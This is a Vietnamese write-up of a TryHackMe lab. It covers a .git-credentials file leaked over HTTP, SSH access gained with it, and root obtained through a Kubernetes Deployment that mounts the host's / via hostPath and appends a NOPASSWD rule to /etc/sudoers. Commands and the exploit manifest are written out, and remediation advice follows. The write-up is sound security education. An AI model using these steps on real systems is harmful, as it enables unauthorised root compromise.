@@ -1,0 +1,160 @@
+---
+title: 'Frank & Herby Make an App'
+description: "Leaked Git credentials from an exposed bootstrap-template site give SSH access, then a hostPath-mounting Kubernetes deployment on microk8s is abused to rewrite the host's sudoers file as root."
+date: 2025-12-05
+platform: tryhackme
+room: 'Frank & Herby Make an App'
+roomUrl: 'https://tryhackme.com/room/frankandherby'
+difficulty: medium
+tags:
+  - 'kubernetes'
+  - 'docker'
+  - 'git-leak'
+  - 'container-escape'
+  - 'linux'
+  - 'cve'
+vulnClasses:
+  - 'exposed credentials in version control'
+  - 'privileged container escape'
+  - 'insecure kubernetes rbac'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Frank & Herby Make an App — Rò Rỉ Git Credentials Dẫn Đến Escape Root Qua hostPath Của Kubernetes**
+
+_Bài viết tường thuật lại phòng "Frank & Herby Make an App" trên TryHackMe. Một file_ _`.git-credentials`_ _bị lộ trên một site bootstrap-template làm lộ quyền truy cập SSH, và một cluster microk8s trên cùng máy bị lợi dụng qua một Deployment mount hostPath để ghi lại file sudoers của host với quyền root._
+
+> Flag đã được ẩn đi. Frank & Herby Make an App là một phòng lab được TryHackMe cho phép khai thác hợp pháp; mọi thứ ở đây được thực hiện trên một mục tiêu luyện tập hợp pháp. Các giá trị hiển thị dưới dạng `<redacted>` là giá trị thật trên máy nhưng đã bị giữ lại, không công khai.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Một file `.git-credentials` bị quên lại trên một site bootstrap-template của nginx làm lộ mật khẩu SSH của `frank` dưới dạng cleartext → SSH vào với tư cách `frank`, người này không có quyền `sudo` nào cả → máy chạy một cluster Kubernetes **microk8s** một node, và một manifest Deployment có sẵn trong repo của chính `frank` chỉ ra đúng mẫu hình cần dùng → dựng một Deployment **mount toàn bộ filesystem root của host (\*\***`hostPath: /`\***\*) vào một pod** rồi `exec` vào đó cho phép chúng ta thêm một rule `NOPASSWD: ALL` vào file `/etc/sudoers` của host → `sudo su -` → root.
+
+Lộ git credentials → bàn đạp SSH → Deployment Kubernetes mount hostPath → ghi lại sudoers → root.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+```
+
+Máy này chạy SSH (22), một app kiểu Meteor/[Rocket.Chat](http://rocket.chat/) ở cổng 3000, đầy đủ bộ cổng kubelet/API-server của microk8s (10250/10255/10257/10259/16443), một app Gunicorn ở cổng 25000, một template nginx "Heroic Features" ở cổng 31337, và một Docker registry ở cổng 32000.
+
+### **Lỗ hổng: một file credential bị commit mà không ai dọn trước khi push**
+
+```text
+dirsearch -u http://$IP:31337/
+# /.git-credentials  [Status: 200]
+```
+
+```text
+curl http://$IP:31337/.git-credentials
+# http://frank:<redacted-url-encoded-password>@192.168.100.50
+```
+
+`.git-credentials` lưu credential HTTP Basic-Auth đã cache của Git dưới dạng cleartext — `<scheme>://<user>:<password>@<host>` — và file này bị để lại trong chính web root được serve ra, thay vì nằm trong home directory của developer.
+
+<Callout type="insight">
+
+Đây chính xác là dạng lỗi "credential nằm trong source control": một secret lẽ ra chỉ nên sống trong một file local, không công khai, lại trở nên truy cập được qua HTTP thuần vì nó đã bị commit — hoặc trong trường hợp này, chỉ đơn giản là bị để quên — bên trong thứ đang được serve ra ngoài.
+
+</Callout>
+
+### **Bước 1 — SSH vào bằng credential bị lộ**
+
+```text
+ssh frank@$IP
+# password: <redacted> (đã URL-decode từ file bị lộ)
+cat user.txt   # -> THM{<redacted>}
+```
+
+`frank` không phải user `sudo` và cũng không nằm trong nhóm `sudo`, nên `sudo -l` thông thường chỉ cho ra ngõ cụt ngay lập tức.
+
+### **Bước 2 — liệt kê cluster mà frank đã có thể nói chuyện với**
+
+```text
+microk8s kubectl get all
+# một Deployment nginx có sẵn, service NodePort ở cổng 31337
+```
+
+Repo của chính `frank` (`~/repos/dk-ml`) chứa manifest Deployment cho service đang chạy đó, và nó đã sẵn thể hiện đúng nguyên tố cần dùng: một volume mount `hostPath`.
+
+### **Bước 3 — một mount hostPath biến "tạo một Deployment" thành "đọc/ghi filesystem của host"**
+
+Đây là mẫu hình **leo thang đặc quyền hostPath của microk8s / Kubernetes đã được biết rõ (CVE-2019-15789 và nhiều biến thể kế thừa)**: bất kỳ user nào tạo được Deployment trong một cluster không hạn chế đều có thể mount một đường dẫn tùy ý của host vào container và đọc/ghi nó với quyền root — không cần exploit container-breakout nào, vì chính volume mount là cú breakout.
+
+```text
+# exploit.yaml — mount / của host vào pod tại /opt/root
+spec:
+  containers:
+    - name: nginx
+      image: localhost:32000/bsnginx
+      command: ["/bin/bash","-c","sleep 10000"]
+      volumeMounts:
+        - name: local-stuff
+          mountPath: /opt/root
+  volumes:
+    - name: local-stuff
+      hostPath:
+        path: /
+        type: Directory
+```
+
+```text
+microk8s kubectl delete deploy nginx-deployment   # giải phóng resource (không bắt buộc)
+microk8s kubectl apply -f exploit.yaml
+microk8s kubectl get pod
+microk8s kubectl exec -it <pod-name> /bin/bash
+```
+
+### **Bước 4 — chỉnh sửa file sudoers của host từ trong pod**
+
+```text
+# trong pod, /opt/root CHÍNH LÀ / của host
+cd /opt/root/etc
+echo "frank   ALL=(ALL:ALL) NOPASSWD: ALL" >> sudoers
+exit
+```
+
+Trở lại host với tư cách `frank`:
+
+```text
+sudo su -
+cat /root/root.txt   # -> THM{<redacted>}
+```
+
+### **Mức độ ảnh hưởng**
+
+<Callout type="critical">
+
+**Nghiêm trọng — CVSS 3.1 9.9** (`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`). Credential của developer bị lộ dẫn thẳng tới root qua Kubernetes không hạn chế; cả hai giai đoạn đều không cần một exploit theo nghĩa truyền thống:
+
+- **Một file credential được serve qua HTTP thuần** trao luôn một tài khoản SSH hoạt động mà không cần đoán xác thực.
+- **Một cluster Kubernetes không hạn chế cho phép một user local không có đặc quyền leo thang lên root** chỉ bằng cách dùng một tính năng (volume `hostPath`) đúng như thiết kế, trên một host mà nó lẽ ra không bao giờ được phép chạm tới.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+1. **Không bao giờ serve working directory của một repo làm web root.** `.git`, `.git-credentials`, và mọi dotfile phải nằm ngoài tầm với của Apache/nginx — và credential phải nằm trong một credential helper hoặc secrets manager, không phải một file cleartext, bất kể nó nằm ở đâu.
+2. **Hạn chế ai được tạo workload trong cluster**, và áp dụng một rule `PodSecurityPolicy`/admission-controller để chặn mount `hostPath` tùy ý (hoặc yêu cầu chúng chỉ đọc và giới hạn vào một subpath cụ thể, không bao giờ là `/`).
+3. **Coi mọi user local có quyền** **`kubectl`** **vào một cluster không hạn chế là tương đương root**, và kiểm soát quyền truy cập cluster giống như cách bạn kiểm soát `sudo`.
+
+</Callout>
+
+### **Những điều rút ra**
+
+- **Một credential bị lộ không cần một exploit tinh vi để trở nên thảm khốc** — một file bị để sai thư mục là đủ.
+- **Volume** **`hostPath`** **là một nguyên tố leo thang đặc quyền, không chỉ là một tính năng tiện lợi.** Nếu một user định nghĩa được Pod spec, và `hostPath` không bị hạn chế, user đó có thể trở thành root trên node.
+- **"Không có quyền sudo" không có nghĩa là "không có đường đến root"** khi máy chạy một container orchestrator với ranh giới tin cậy hoàn toàn riêng của nó.
+
+Cảm ơn đã đọc. Frank & Herby Make an App là một ví dụ rõ ràng cho thấy một file credential bị quên, kết hợp với một cluster Kubernetes local không được hạn chế đủ, cộng lại thành chiếm toàn quyền host.
